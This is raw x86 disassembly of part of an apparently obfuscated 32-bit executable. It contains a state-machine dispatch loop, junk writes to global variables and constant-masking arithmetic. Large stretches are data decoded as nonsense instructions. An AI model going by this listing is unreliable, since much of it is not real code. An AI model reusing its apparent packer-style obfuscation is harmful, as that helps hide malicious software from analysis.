  4091cf:	je     0x4091a5
  4091d1:	pushf  
  4091d2:	jns    0x4091bc
  4091d4:	mov    al,ds:0x73fb9e1b
  4091d9:	xchg   DWORD PTR [esi+eiz*4],ebx
  4091dc:	jne    0x40924b
  4091de:	push   esp
  4091df:	xor    edi,eax
  4091e1:	test   eax,0x74b8cac2
  4091e6:	pop    edx
  4091e7:	mov    DWORD PTR [ebx],esi
  4091e9:	jns    0x40919a
  4091eb:	add    al,0xd3
  4091ed:	ins    DWORD PTR es:[edi],dx
  4091ee:	jmp    0x84930580
  4091f3:	cld    
  4091f4:	and    ch,BYTE PTR [edx+esi*1-0x516b422c]
  4091fb:	outs   dx,BYTE PTR ds:[esi]
  4091fc:	dec    esi
  4091fd:	pop    esi
  4091fe:	adc    DWORD PTR [edi+0x2a],edi
  409201:	outs   dx,DWORD PTR ds:[esi]
  409202:	dec    edx
  409203:	in     eax,dx
  409204:	cs mov dl,0xae
  409207:	push   0x85797942
  40920c:	imul   ebp,DWORD PTR [ebp-0x45],0x4f7518bb
  409213:	sub    ecx,ebp
  409215:	call   0x1f02:0x99a58534
  40921c:	loop   0x40924e
  40921e:	or     edx,DWORD PTR [ebp+0x1a9bd110]
  409224:	sbb    eax,0xaa50f2ce
  409229:	sub    al,0xf9
  40922b:	es mov bl,0x48
  40922e:	inc    esp
  40922f:	and    al,0xd4
  409231:	xchg   ebp,eax
  409232:	(bad)  
  409233:	push   ebp
  409234:	(bad)  
  409235:	sahf   
  409236:	shr    DWORD PTR [ecx+0x4e],1
  409239:	retf   
  40923a:	cmp    DWORD PTR [esi+0x2d51f882],ebx
  409240:	jge    0x4091c4
  409242:	lock sbb ah,dl
  409245:	add    DWORD PTR [eax+esi*8],0x5bb5b907
  40924c:	popf   
  40924d:	or     al,0x3
  40924f:	std    
  409250:	jl     0x40926c
  409252:	mov    cl,0x5d
  409254:	jns    0x409200
  409256:	(bad)  
  409257:	push   ebx
  409258:	js     0x4092ca
  40925a:	xlat   BYTE PTR ds:[ebx]
  40925b:	push   esi
  40925c:	shl    DWORD PTR [edi-0x6f28d758],0xba
  409263:	jns    0x40925e
  409265:	test   eax,0xf031e754
  40926a:	sbb    al,0x5e
  40926c:	jb     0x409277
  40926e:	lods   al,BYTE PTR ds:[esi]
  40926f:	mov    bl,0xe0
  409271:	ja     0x409278
  409273:	cmp    BYTE PTR [esi-0x2f2e54],0x6a
  40927a:	lea    ecx,[edx-0x26172b6b]
  409280:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409281:	repz pop edi
  409283:	clc    
  409284:	(bad)  
  409285:	mov    esp,0x9a704bdc
  40928a:	pop    eax
  40928b:	inc    ebx
  40928c:	fwait
  40928d:	cs mul ebx
  409290:	mov    ecx,ebx
  409292:	das    
  409293:	mov    al,ds:0x11a83da2
  409298:	cli    
  409299:	push   0xffffffc1
  40929b:	mov    edi,0xc21a41b2
  4092a0:	mov    ebx,es
  4092a2:	mov    ds:0x3a17603b,al
  4092a7:	sbb    ebx,DWORD PTR [eax]
  4092a9:	ja     0x40927e
  4092ab:	inc    esi
  4092ac:	lds    edx,FWORD PTR [eax-0x6f]
  4092af:	push   ss
  4092b0:	jg     0x409275
  4092b2:	adc    eax,DWORD PTR [esi]
  4092b4:	cld    
  4092b5:	push   esi
  4092b6:	stos   BYTE PTR es:[edi],al
  4092b7:	ret    0x175d
  4092ba:	adc    DWORD PTR [edx],ecx
  4092bc:	mov    ebx,0x761eb3ef
  4092c1:	sbb    dl,dl
  4092c3:	adc    ah,BYTE PTR [edi+0x1e]
  4092c6:	repnz or dl,BYTE PTR ds:0xd7c2d130
  4092ce:	test   BYTE PTR [ebx-0x69],cl
  4092d1:	dec    edi
  4092d2:	and    al,0xe2
  4092d4:	or     ebp,DWORD PTR [ebp-0x70e9f0f9]
  4092da:	movhps xmm5,QWORD PTR [ebp+0x23e988a7]
  4092e1:	fidiv  DWORD PTR [eax-0x7ce71c8d]
  4092e7:	pop    ecx
  4092e8:	cld    
  4092e9:	jae    0x4092a1
  4092eb:	icebp  
  4092ec:	fimul  DWORD PTR [ebp-0x13]
  4092ef:	xor    edi,ebx
  4092f1:	sbb    ah,BYTE PTR [ebp+0x4]
  4092f4:	in     eax,dx
  4092f5:	shl    BYTE PTR cs:[eax],0x78
  4092f9:	jns    0x4092ee
  4092fb:	test   al,0xc5
  4092fd:	sar    BYTE PTR ds:0x5fb34a21,cl
  409303:	push   ebp
  409304:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409305:	xchg   esi,ecx
  409307:	xor    al,0xe1
  409309:	jg     0x40929b
  40930b:	test   eax,0x65d2bccb
  409310:	xor    eax,0xe0f753cc
  409315:	pop    ecx
  409316:	inc    esp
  409317:	retf   
  409318:	push   0xffffffb0
  40931a:	(bad)  
  40931b:	into   
  40931c:	add    al,0x50
  40931e:	fisub  WORD PTR [edx]
  409320:	stos   DWORD PTR es:[edi],eax
  409321:	inc    ebp
  409322:	xchg   ecx,eax
  409323:	mov    eax,0xe24c3759
  409328:	mov    ch,BYTE PTR [eax-0x6e3478a8]
  40932e:	push   eax
  40932f:	repz mov ah,0x79
  409332:	xchg   edi,eax
  409333:	push   edi
  409334:	(bad)  
  409335:	call   0x3ef95858
  40933a:	(bad)  
  40933b:	push   edx
  40933c:	fisub  DWORD PTR [edi]
  40933e:	mov    edx,0x458b00db
  409343:	in     al,dx
  409344:	jmp    0x4084bd
  409349:	mov    eax,DWORD PTR [ebp-0xc]
  40934c:	mov    edx,DWORD PTR [ebp-0x18]
  40934f:	xor    eax,edx
  409351:	cmp    eax,0xa08c1d35
  409356:	je     0x4084ba
  40935c:	mov    eax,DWORD PTR [ebp-0x10]
  40935f:	add    DWORD PTR [eax],0x7403501
  409365:	jmp    0x4084ba
  40936a:	mov    eax,DWORD PTR [ebp-0x1c]
  40936d:	cmp    DWORD PTR [eax],edi
  40936f:	je     0x4084ba
  409375:	mov    eax,0x800f1c9c
  40937a:	jmp    0x4084c1
  40937f:	push   ebp
  409380:	mov    ebp,esp
  409382:	sub    esp,0x60
  409385:	adc    eax,DWORD PTR ds:0x4336e3
  40938b:	jmp    0x4094bf
  409390:	add    al,0xbb
  409392:	js     0x4093e4
  409394:	inc    ebx
  409395:	push   ebx
  409396:	push   esp
  409397:	dec    ebx
  409398:	xor    al,0xcd
  40939a:	in     al,dx
  40939b:	les    ebx,FWORD PTR ds:0x9ef6cc70
  4093a1:	in     eax,dx
  4093a2:	jl     0x409420
  4093a4:	adc    eax,0x3f7c7c7f
  4093a9:	lods   al,BYTE PTR ds:[esi]
  4093aa:	push   edi
  4093ab:	mov    dh,0xe4
  4093ad:	ss pop esp
  4093af:	pop    ecx
  4093b0:	jl     0x4093a9
  4093b2:	jmp    0x40935e
  4093b4:	leave  
  4093b5:	xor    al,0x47
  4093b7:	adc    ah,BYTE PTR [ebp-0x54]
  4093ba:	jo     0x409434
  4093bc:	xchg   edx,eax
  4093bd:	push   0x40d75137
  4093c2:	sbb    DWORD PTR [ebx+0xa],edx
  4093c5:	repz stc 
  4093c7:	dec    ebp
  4093c8:	mov    esp,0x8f8498e6
  4093cd:	mov    al,0x1c
  4093cf:	cmp    DWORD PTR [ecx],esp
  4093d1:	xchg   esp,eax
  4093d2:	test   eax,0xc3db811
  4093d7:	mov    edx,0x5f85ae3d
  4093dc:	shl    BYTE PTR [ecx+0x37],1
  4093df:	das    
  4093e0:	mov    eax,0x7581030f
  4093e5:	pop    esi
  4093e6:	xor    BYTE PTR [eax-0x40d9e7c8],ah
  4093ec:	push   ecx
  4093ed:	fild   WORD PTR [ebp+0x19]
  4093f0:	xor    DWORD PTR [edi+0x63c27cbc],esp
  4093f6:	mov    dh,0x7
  4093f8:	push   0x61
  4093fa:	push   edx
  4093fb:	dec    edi
  4093fc:	xchg   DWORD PTR [eax],edi
  4093fe:	xchg   ecx,eax
  4093ff:	cmp    BYTE PTR [eax-0x7f],bh
  409402:	rcl    DWORD PTR [esp+ebx*2-0x416ebfa4],cl
  409409:	adc    al,0x54
  40940b:	jl     0x4093a4
  40940d:	(bad)  
  40940e:	in     al,dx
  40940f:	mov    ds:0x86ebb0bb,al
  409414:	mov    ch,0x2e
  409416:	push   0xffffff81
  409418:	rcl    BYTE PTR [eax],cl
  40941a:	sub    DWORD PTR [ebp-0x53],0x3b0b435f
  409421:	loope  0x4093af
  409423:	test   DWORD PTR [ebp-0x76],ecx
  409426:	push   0x1d
  409428:	pop    ebx
  409429:	jle    0x4093f6
  40942b:	out    0x56,eax
  40942d:	dec    eax
  40942e:	pusha  
  40942f:	xchg   ebp,eax
  409430:	repz iret 
  409432:	fistp  WORD PTR es:0x43ecde6f
  409439:	daa    
  40943a:	push   edi
  40943b:	arpl   WORD PTR [ebx+0x79],bp
  40943e:	push   ss
  40943f:	scas   eax,DWORD PTR es:[edi]
  409440:	es pop ebp
  409442:	aad    0xc7
  409444:	fcmovu st,st(6)
  409446:	xchg   ah,cl
  409448:	outs   dx,DWORD PTR ds:[esi]
  409449:	leave  
  40944a:	inc    eax
  40944b:	icebp  
  40944c:	(bad)  [edi]
  40944e:	lahf   
  40944f:	(bad)  
  409450:	int3   
  409451:	mov    BYTE PTR [ecx],bl
  409453:	or     eax,DWORD PTR [esi+0x3ac8a9c4]
  409459:	repnz xlat BYTE PTR ds:[ebx]
  40945b:	xor    bl,BYTE PTR [ebp+0x43a1516b]
  409461:	fdiv   QWORD PTR [ebx-0x23]
  409464:	mov    eax,ds:0xc3b8258
  409469:	adc    ch,bl
  40946b:	mov    edx,0xa14605c4
  409470:	push   ss
  409471:	iret   
  409472:	adc    ebx,DWORD PTR [ecx-0x6b]
  409475:	imul   esp,DWORD PTR [ebp-0x2c51683e],0xa6a2f3ff
  40947f:	pop    esi
  409480:	pop    esi
  409481:	xchg   edi,eax
  409482:	cmp    esp,DWORD PTR [ebp-0x35]
  409485:	sub    ebp,DWORD PTR [ebp+0x74]
  409488:	dec    edi
  409489:	pusha  
  40948a:	dec    edx
  40948b:	loope  0x409495
  40948d:	jecxz  0x4094a2
  40948f:	daa    
  409490:	in     eax,0x29
  409492:	add    al,0xd1
  409494:	test   al,0x3
  409496:	mov    dh,BYTE PTR [edx+0x35]
  409499:	retf   
  40949a:	(bad)  
  40949b:	mov    WORD PTR ds:0xa17bd4b3,?
  4094a1:	fucomi st,st(2)
  4094a3:	loop   0x409436
  4094a5:	mov    ecx,0x68b194e4
  4094aa:	loop   0x40943e
  4094ac:	stos   BYTE PTR es:[edi],al
  4094ad:	mov    bl,0x7f
  4094af:	stc    
  4094b0:	iret   
  4094b1:	mov    dh,0x3e
  4094b3:	into   
  4094b4:	gs jbe 0x40950d
  4094b7:	aam    0x13
  4094b9:	dec    edi
  4094ba:	neg    DWORD PTR [ebp+eax*8-0x73]
  4094be:	pop    ds
  4094bf:	mov    eax,DWORD PTR [ebp+0x8]
  4094c2:	or     DWORD PTR ds:0x4336e7,0xc38
  4094cc:	push   ebx
  4094cd:	adc    DWORD PTR ds:0x433657,0x6147
  4094d7:	push   esi
  4094d8:	mov    esi,0x7510853
  4094dd:	add    DWORD PTR ds:0x433767,0x296a
  4094e7:	xor    eax,esi
  4094e9:	and    ebx,0x43d6
  4094ef:	mov    ebx,0x32729a
  4094f4:	and    DWORD PTR ds:0x43365f,0x433657
  4094fe:	add    eax,ebx
  409500:	adc    DWORD PTR ds:0x43375f,0x1959
  40950a:	push   edi
  40950b:	or     DWORD PTR ds:0x4336ab,ecx
  409511:	mov    DWORD PTR [ebp-0x18],eax
  409514:	and    DWORD PTR ds:0x43365b,0x4f47
  40951e:	mov    edi,DWORD PTR [ebp+0x8]
  409521:	xor    edi,esi
  409523:	sbb    DWORD PTR ds:0x4336af,0x43376b
  40952d:	mov    DWORD PTR [ebp-0xc],0xf89c85f5
  409534:	or     DWORD PTR ds:0x4336af,0x30d7
  40953e:	mov    DWORD PTR [ebp-0x10],0xf89c8735
  409545:	add    DWORD PTR ds:0x433667,0x43372f
  40954f:	add    edi,ebx
  409551:	jmp    0x4099a2
  409556:	mov    DWORD PTR ds:0x433697,0x217e
  409560:	cmp    edi,0x40
  409563:	mov    DWORD PTR ds:0x4336ef,0x49f
  40956d:	jne    0x4095a6
  409573:	mov    DWORD PTR ds:0x43376b,ecx
  409579:	mov    eax,ds:0x413996
  40957e:	mov    eax,DWORD PTR [eax]
  409580:	mov    DWORD PTR ds:0x433663,0x21e9
  40958a:	mov    DWORD PTR [ebp-0x14],eax
  40958d:	mov    eax,ds:0x413b9e
  409592:	mov    DWORD PTR ds:0x43372f,0x54b7
  40959c:	mov    eax,DWORD PTR [eax]
  40959e:	mov    DWORD PTR [ebp-0x18],eax
  4095a1:	jmp    0x409996
  4095a6:	mov    DWORD PTR ds:0x43364b,0x76e8
  4095b0:	jmp    0x4096e4
  4095b5:	and    al,0x36
  4095b7:	popf   
  4095b8:	les    ebx,FWORD PTR [ebp-0x6f09829d]
  4095be:	lahf   
  4095bf:	jmp    0x40958c
  4095c1:	mov    WORD PTR [eax+esi*8+0x79],ss
  4095c5:	mov    bh,0xec
  4095c7:	jl     0x409645
  4095c9:	adc    eax,0xdb7c7c7f
  4095ce:	ins    BYTE PTR es:[edi],dx
  4095cf:	pushf  
  4095d0:	cs mov ecx,0xc20af36f
  4095d6:	mov    dl,0x94
  4095d8:	cmp    eax,0xaffa6c27
  4095dd:	inc    edi
  4095de:	sbb    dh,BYTE PTR [ebp-0x42db3f4d]
  4095e4:	mov    ebx,0x2111d18b
  4095e9:	cmp    eax,0x2f6ad392
  4095ee:	cmc    
  4095ef:	mov    edi,0x48a48376
  4095f4:	or     eax,0xb8061b09
  4095f9:	cmp    al,ch
  4095fb:	add    al,0x62
  4095fd:	sbb    ebp,DWORD PTR [eax+0x58]
  409600:	mov    edi,0x88b9b038
  409605:	pop    ecx
  409606:	pusha  
  409607:	and    dl,BYTE PTR [edx]
  409609:	inc    esi
  40960a:	adc    eax,0x8457842f
  40960f:	inc    ecx
  409610:	ror    BYTE PTR [edx],1
  409612:	pop    edx
  409613:	call   0x5765:0x9bfac2b6
  40961a:	mov    dl,0x4d
  40961c:	push   cs
  40961d:	jcxz   0x40964d
  409620:	sbb    dl,BYTE PTR [edi]
  409622:	outs   dx,BYTE PTR ds:[esi]
  409623:	push   ds
  409624:	jecxz  0x4095b3
  409626:	mov    edi,0x4d030952
  40962b:	fcom   QWORD PTR [ecx+eax*2]
  40962e:	mov    ecx,DWORD PTR [ebp+0x53ca28dc]
  409634:	dec    esp
  409635:	jmp    0x40963e
  409637:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409638:	cmp    eax,0xdade59d2
  40963d:	mov    esp,0x23f98cc7
  409642:	mov    ebx,DWORD PTR [ecx-0x4c]
  409645:	test   eax,0xcc615093
  40964a:	in     al,dx
  40964b:	das    
  40964c:	add    edx,ecx
  40964e:	cmp    ebx,DWORD PTR [edi+0x61]
  409651:	mov    eax,0xfeda2db4
  409656:	push   edi
  409657:	pop    es
  409658:	xor    eax,0x79ccd82d
  40965d:	pop    ss
  40965e:	ret    0x3704
  409661:	push   eax
  409662:	cmp    eax,0xffaf7e9a
  409667:	fsubr  DWORD PTR es:[eax]
  40966a:	dec    ecx
  40966b:	lods   al,BYTE PTR ds:[esi]
  40966c:	mov    esi,eax
  40966e:	lods   eax,DWORD PTR ds:[esi]
  40966f:	out    dx,al
  409670:	xchg   edx,eax
  409671:	add    DWORD PTR [edi-0x580a5cb7],ebx
  409677:	lods   eax,DWORD PTR ds:[esi]
  409678:	cmc    
  409679:	cld    
  40967a:	or     eax,0x965148c6
  40967f:	hlt    
  409680:	pop    edi
  409681:	sub    eax,0x2c45c66a
  409686:	aaa    
  409687:	push   ecx
  409688:	mov    edi,0xef035c49
  40968d:	jae    0x40969b
  40968f:	mov    ?,WORD PTR ds:0x2e5e28c7
  409695:	call   0x6a1d9d6e
  40969a:	add    BYTE PTR [ecx+0x24edab09],dh
  4096a0:	(bad)  
  4096a2:	cmp    DWORD PTR [ebx-0x40c4e2b],0x5b
  4096a9:	push   eax
  4096aa:	sti    
  4096ab:	fadd   st,st(4)
  4096ad:	repz xchg esp,eax
  4096af:	fisttp WORD PTR [edx+edx*2]
  4096b2:	ss das 
  4096b4:	lods   al,BYTE PTR ds:[esi]
  4096b5:	add    cl,BYTE PTR [ebp+0x79]
  4096b8:	push   edi
  4096b9:	sbb    al,0xa4
  4096bb:	add    eax,0xb0d2b1cd
  4096c0:	push   0x53
  4096c2:	sub    eax,0x9f04287f
  4096c7:	mov    ah,0xcc
  4096c9:	jo     0x409708
  4096cb:	mov    cl,0xca
  4096cd:	xchg   esp,eax
  4096ce:	cs hlt 
  4096d0:	int    0xd
  4096d2:	xor    bl,BYTE PTR [esi]
  4096d4:	not    DWORD PTR [esi]
  4096d6:	aaa    
  4096d7:	fimul  DWORD PTR [ebx]
  4096d9:	retf   0x71e3
  4096dc:	pop    eax
  4096dd:	sub    al,0x17
  4096df:	mov    eax,ds:0xff16ab34
  4096e4:	cmp    edi,0x33d
  4096ea:	mov    DWORD PTR ds:0x4336d7,0x197
  4096f4:	jne    0x409766
  4096fa:	and    DWORD PTR [ebp+0x8],0x0
  4096fe:	mov    eax,DWORD PTR [ebp-0x8]
  409701:	or     DWORD PTR ds:0x433723,0x4336e3
  40970b:	sub    eax,DWORD PTR [ebp+0x8]
  40970e:	push   eax
  40970f:	mov    eax,ds:0x433763
  409714:	or     DWORD PTR ds:0x433723,eax
  40971a:	mov    eax,DWORD PTR [ebp-0x4]
  40971d:	add    DWORD PTR ds:0x43363f,0x4336af
  409727:	add    eax,DWORD PTR [ebp+0x8]
  40972a:	sub    DWORD PTR ds:0x433727,0x4336a7
  409734:	push   eax
  409735:	dec    DWORD PTR ds:0x43364b
  40973b:	call   0x4099bc
  409740:	mov    DWORD PTR ds:0x433717,0x29a7
  40974a:	inc    DWORD PTR [ebp+0x8]
  40974d:	cmp    DWORD PTR [ebp+0x8],0x52
  409751:	mov    DWORD PTR ds:0x43365f,0x7d48
  40975b:	jb     0x4096fe
  409761:	jmp    0x409996
  409766:	mov    DWORD PTR ds:0x4336ef,0x5779
  409770:	cmp    edi,0x1a3
  409776:	mov    DWORD PTR ds:0x433767,0x175d
  409780:	jne    0x409964
  409786:	movzx  eax,BYTE PTR ds:0x43363f
  40978d:	and    DWORD PTR ds:0x4336af,eax
  409793:	mov    DWORD PTR [ebp-0x60],0xf89c8539
  40979a:	add    DWORD PTR ds:0x43372f,ebx
  4097a0:	mov    eax,DWORD PTR [ebp-0x4]
  4097a3:	xor    DWORD PTR ds:0x43369f,0x2808
  4097ad:	mov    DWORD PTR [ebp-0x5c],eax
  4097b0:	sub    eax,DWORD PTR ds:0x4336e7
  4097b6:	mov    eax,DWORD PTR [ebp-0x8]
  4097b9:	mov    DWORD PTR [ebp-0x58],eax
  4097bc:	mov    eax,DWORD PTR [ebp-0xc]
  4097bf:	xor    eax,esi
  4097c1:	and    DWORD PTR ds:0x433727,0x5f09
  4097cb:	add    eax,ebx
  4097cd:	and    DWORD PTR ds:0x43365f,0x3046
  4097d7:	mov    DWORD PTR [ebp-0x54],eax
  4097da:	sbb    DWORD PTR ds:0x4336eb,0x433733
  4097e4:	lea    eax,[ebp-0x1c]
  4097e7:	add    DWORD PTR ds:0x43371b,0x7d23
  4097f1:	mov    DWORD PTR [ebp-0x50],eax
  4097f4:	sub    eax,DWORD PTR ds:0x43365f
  4097fa:	mov    eax,DWORD PTR [ebp-0x60]
  4097fd:	or     DWORD PTR ds:0x4336b3,0x4336af
  409807:	xor    eax,esi
  409809:	add    eax,ebx
  40980b:	mov    DWORD PTR [ebp-0x60],eax
  40980e:	lea    eax,[ebp-0x60]
  409811:	push   eax
  409812:	mov    eax,DWORD PTR [ebp+0xc]
  409815:	jmp    0x409949
  40981a:	xchg   cl,bl
  40981c:	fs jg  0x409886
  40981f:	and    DWORD PTR [ecx+0x61],0x87fe859e
  409826:	xchg   edx,eax
  409827:	or     al,0xf1
  409829:	ja     0x409877
  40982b:	out    dx,eax
  40982c:	jl     0x4098aa
  40982e:	adc    eax,0xa97c7c7f
  409833:	rol    BYTE PTR ds:0x4ecc9fea,0x72
  40983a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40983b:	fnsave [eax+0xf]
  40983e:	jo     0x409897
  409840:	mov    ebp,0x174311c
  409845:	xor    dh,BYTE PTR [ebx+0x72]
  409848:	inc    edi
  409849:	mov    ecx,0x859c7a46
  40984e:	lfs    edi,FWORD PTR [edi+0x63]
  409852:	sbb    DWORD PTR [esi-0x3c8a8f89],ecx
  409858:	lock sbb dl,BYTE PTR [edx-0xc]
  40985c:	pop    edx
  40985d:	xchg   ebx,eax
  40985e:	repz jg 0x40981c
  409861:	pop    esp
  409862:	rcl    ebp,1
  409864:	mov    cl,0xb1
  409866:	mul    DWORD PTR [eax+0x421971bb]
  40986c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40986d:	js     0x409825
  40986f:	mov    eax,ds:0x4407cee0
  409874:	add    BYTE PTR [edi],ch
  409876:	sub    ah,BYTE PTR [ebx+0x53]
  409879:	xor    al,0xd
  40987b:	push   0xffffffa8
  40987d:	cmp    bl,ch
  40987f:	jnp    0x409893
  409881:	daa    
  409882:	jmp    0x601db6b
  409887:	cwde   
  409888:	sar    BYTE PTR ds:0x4c2d7824,0x53
  40988f:	sbb    al,0x76
  409891:	jne    0x4098ef
  409893:	stc    
  409894:	leave  
  409895:	mov    BYTE PTR [edi+0x76],0x6f
  409899:	test   BYTE PTR [esi+0x7b4a54db],bl
  40989f:	stos   DWORD PTR es:[edi],eax
  4098a0:	mov    bl,0xb8
  4098a2:	test   al,0x90
  4098a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098a5:	jg     0x40985f
  4098a7:	out    dx,eax
  4098a8:	fdiv   QWORD PTR [esi]
  4098aa:	lods   al,BYTE PTR ds:[esi]
  4098ab:	les    eax,FWORD PTR [edx+0x2c]
  4098ae:	imul   ecx,DWORD PTR [eax],0xdd5eeb74
  4098b4:	in     eax,dx
  4098b5:	mov    dl,0xbf
  4098b7:	loopne 0x409903
  4098b9:	fucomi st,st(2)
  4098bb:	and    al,0xc
  4098be:	add    eax,0x7f6ce730
  4098c3:	dec    edx
  4098c4:	jecxz  0x409937
  4098c6:	rcr    DWORD PTR [esi-0x7d],cl
  4098c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098ca:	in     eax,dx
  4098cb:	pushfw 
  4098cd:	push   ecx
  4098ce:	icebp  
  4098cf:	(bad)  
  4098d0:	and    esi,eax
  4098d2:	out    0x3d,al
  4098d4:	pusha  
  4098d5:	shl    DWORD PTR [esp+edx*8-0x17],0x48
  4098da:	call   0xe15c:0x374c1f57
  4098e1:	not    DWORD PTR [esi-0x54f88c63]
  4098e7:	sub    cl,0x3d
  4098ea:	xlat   BYTE PTR ds:[ebx]
  4098eb:	add    BYTE PTR [eax+0x7e],ch
  4098ee:	jmp    0x21b72135
  4098f3:	dec    esp
  4098f4:	or     eax,0x7b69c009
  4098f9:	stos   BYTE PTR es:[edi],al
  4098fa:	addr16 jge 0x4098c0
  4098fd:	xchg   esp,eax
  4098fe:	push   esi
  4098ff:	inc    edx
  409900:	adc    ebx,DWORD PTR fs:[edx]
  409903:	and    al,0x9b
  409905:	mov    esi,0x718579c7
  40990a:	scas   eax,DWORD PTR es:[edi]
  40990b:	jmp    0x4098c9
  40990d:	aas    
  40990e:	or     eax,0x6d5b05f8
  409913:	das    
  409914:	pop    edx
  409915:	jl     0x40993d
  409917:	mov    esi,0x943b45dd
  40991c:	push   es
  40991d:	rcl    BYTE PTR [edx+0x79],cl
  409920:	xor    cl,BYTE PTR [ecx]
  409922:	in     eax,dx
  409923:	push   ebp
  409924:	or     al,0x76
  409926:	popf   
  409927:	mov    ds:0x457bd784,al
  40992c:	hlt    
  40992d:	or     al,0x38
  40992f:	mov    esi,0x42b2649a
  409934:	bound  edx,QWORD PTR [esi-0x6a44f6ab]
  40993a:	je     0x4098e0
  40993c:	and    eax,0xdca4701
  409941:	mov    dh,0x9
  409943:	in     al,0xad
  409945:	sub    DWORD PTR [ebp+0xa],ecx
  409948:	icebp  
  409949:	xor    eax,esi
  40994b:	add    eax,ebx
  40994d:	push   eax
  40994e:	mov    eax,ds:0x413b36
  409953:	push   0x413a8c
  409958:	push   DWORD PTR [eax]
  40995a:	call   0x4100b5
  40995f:	jmp    0x409996
  409964:	cmp    edi,0x13d
  40996a:	jne    0x409996
  409970:	mov    eax,DWORD PTR [ebp-0x10]
  409973:	xor    eax,esi
  409975:	add    eax,ebx
  409977:	mov    DWORD PTR [ebp+0x8],eax
  40997a:	mov    eax,ds:0x413b16
  40997f:	mov    DWORD PTR [ebp+0x8],eax
  409982:	mov    eax,DWORD PTR [ebp-0x14]
  409985:	mov    DWORD PTR [ebp-0x4],eax
  409988:	mov    eax,DWORD PTR [ebp-0x4]
  40998b:	push   0x4
  40998d:	pop    ecx
  40998e:	sub    ecx,eax
  409990:	add    ecx,DWORD PTR [ebp-0x18]
  409993:	mov    DWORD PTR [ebp-0x8],ecx
  409996:	mov    eax,DWORD PTR [ebp+0xc]
  409999:	xor    eax,esi
  40999b:	lea    edi,[edi+eax*1+0x32729a]
  4099a2:	cmp    edi,0x50b
  4099a8:	jne    0x409556
  4099ae:	mov    eax,DWORD PTR [ebp+0xc]
  4099b1:	pop    edi
  4099b2:	xor    eax,esi
  4099b4:	pop    esi
  4099b5:	add    eax,ebx
  4099b7:	pop    ebx
  4099b8:	leave  
  4099b9:	ret    0x8
  4099bc:	push   ebp
  4099bd:	mov    ebp,esp
  4099bf:	sub    esp,0x44
  4099c2:	neg    edx
  4099c4:	push   edi
  4099c5:	mov    eax,DWORD PTR [ebp+0xc]
  4099c8:	mov    edi,DWORD PTR ds:0x433733
  4099ce:	sub    DWORD PTR ds:0x43363f,edi
  4099d4:	mov    DWORD PTR [ebp-0x10],eax
  4099d7:	and    DWORD PTR ds:0x4336ef,0x1af7
  4099e1:	mov    eax,DWORD PTR [ebp+0x8]
  4099e4:	mov    DWORD PTR [ebp+0x8],0xf89c8535
  4099eb:	and    DWORD PTR ds:0x43372f,ebx
  4099f1:	mov    DWORD PTR [ebp-0x20],0xf89c8534
  4099f8:	or     DWORD PTR ds:0x4336b3,ebx
  4099fe:	mov    edx,DWORD PTR [ebp+0x8]
  409a01:	add    DWORD PTR ds:0x43364f,ebx
  409a07:	mov    DWORD PTR [ebp-0x40],eax
  409a0a:	mov    eax,0x7510853
  409a0f:	mov    DWORD PTR ds:0x4336e3,0x1e
  409a19:	cmp    DWORD PTR ds:0x4336e3,0x0
  409a20:	je     0x409a5e
  409a26:	cmp    DWORD PTR ds:0x4336e3,0x20
  409a2d:	jne    0x409a46
  409a33:	push   DWORD PTR [ebp-0xc]
  409a36:	push   0x43371b
  409a3b:	push   0x4dbc
  409a40:	call   DWORD PTR ds:0x412198
  409a46:	mov    edi,DWORD PTR ds:0x4336e3
  409a4c:	dec    edi
  409a4d:	mov    DWORD PTR ds:0x4336e3,edi
  409a53:	jmp    0x409a19
  409a58:	sbb    DWORD PTR ds:0x433773,ebx
  409a5e:	xor    edx,eax
  409a60:	and    DWORD PTR ds:0x4336db,0x1370
  409a6a:	mov    ecx,0x32729a
  409a6f:	xor    edi,DWORD PTR ds:0x433653
  409a75:	add    edx,ecx
  409a77:	adc    edi,0x4100
  409a7d:	mov    DWORD PTR [ebp-0x8],edx
  409a80:	mov    DWORD PTR ds:0x43363f,0x11
  409a8a:	cmp    DWORD PTR ds:0x43363f,0x0
  409a91:	je     0x409aec
  409a97:	cmp    DWORD PTR ds:0x43363f,0x6
  409a9e:	jne    0x409ab4
  409aa4:	push   0x53f1
  409aa9:	push   0x7cf0
  409aae:	call   DWORD PTR ds:0x412260
  409ab4:	cmp    DWORD PTR ds:0x43363f,0x7
  409abb:	jne    0x409ad0
  409ac1:	xor    edi,edi
  409ac3:	add    edi,DWORD PTR ds:0x43363f
  409ac9:	dec    edi
  409aca:	mov    DWORD PTR ds:0x43363f,edi
  409ad0:	mov    edi,DWORD PTR ds:0x43363f
  409ad6:	dec    edi
  409ad7:	mov    DWORD PTR ds:0x43363f,edi
  409add:	jmp    0x409a8a
  409ae2:	add    DWORD PTR ds:0x43372b,0x300c
  409aec:	mov    edx,DWORD PTR [ebp+0x8]
  409aef:	and    DWORD PTR ds:0x4336a3,0x0
  409af9:	jmp    0x409b0b
  409afe:	mov    edi,DWORD PTR ds:0x4336a3
  409b04:	inc    edi
  409b05:	mov    DWORD PTR ds:0x4336a3,edi
  409b0b:	cmp    DWORD PTR ds:0x4336a3,0x1c
  409b12:	jae    0x409b5e
  409b18:	cmp    DWORD PTR ds:0x4336a3,0x5
  409b1f:	jne    0x409b33
  409b25:	push   0x776c
  409b2a:	push   DWORD PTR [ebp-0x18]
  409b2d:	call   DWORD PTR ds:0x41219c
  409b33:	cmp    DWORD PTR ds:0x4336a3,0x4
  409b3a:	jne    0x409b4f
  409b40:	xor    edi,edi
  409b42:	xor    edi,DWORD PTR ds:0x4336a3
  409b48:	inc    edi
  409b49:	mov    DWORD PTR ds:0x4336a3,edi
  409b4f:	jmp    0x409afe
  409b54:	or     DWORD PTR ds:0x433717,0x2a5
  409b5e:	xor    edx,eax
  409b60:	or     edi,DWORD PTR ds:0x433697
  409b66:	add    edx,ecx
  409b68:	xor    edi,edi
  409b6a:	add    edi,DWORD PTR ds:0x43372f
  409b70:	or     edi,DWORD PTR ds:0x43369f
  409b76:	mov    DWORD PTR ds:0x43372f,edi
  409b7c:	mov    DWORD PTR [ebp+0xc],edx
